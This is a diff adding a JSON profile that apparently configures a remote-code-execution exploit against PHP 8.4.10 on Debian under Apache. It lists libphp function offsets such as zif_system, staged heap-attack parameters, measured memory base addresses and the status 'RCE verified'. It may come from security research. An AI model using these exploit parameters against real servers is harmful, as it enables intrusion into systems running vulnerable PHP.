@@ -1,0 +1,63 @@
+{
+  "name": "php-8.4.10-bookworm-amd64",
+  "php_version": "8.4.10",
+  "branch": "8.4",
+  "fixed_in": "8.4.27",
+  "sapi": "apache2handler",
+  "arch": "amd64",
+  "distro": "debian",
+  "verified": true,
+  "rce": true,
+  "oom_mb": 12,
+  "upstream_profile": "bookworm",
+  "libphp": {
+    "zif_system": "0x43b7d0",
+    "zval_ptr_dtor": "0x62cf70",
+    "htdata": "0x690d8"
+  },
+  "stages": {
+    "stage1_n": 841,
+    "stage1_forge_len": 63,
+    "stage2_t": 406,
+    "stage2_v": 16,
+    "stage3_pads": [
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ],
+      [
+        31,
+        31
+      ]
+    ],
+    "stage3_carrier": true,
+    "stage3_mode": "carrier"
+  },
+  "config": {
+    "memory_limit": 8388608,
+    "display_errors": "On (web SAPI, stage-1 leak succeeded)",
+    "session_upload_progress": "On",
+    "workers": 1
+  },
+  "measured": {
+    "chunk_base": "0x7f0493400000",
+    "libphp_base": "0x7f04916f2000"
+  },
+  "status": "RCE verified"
+}
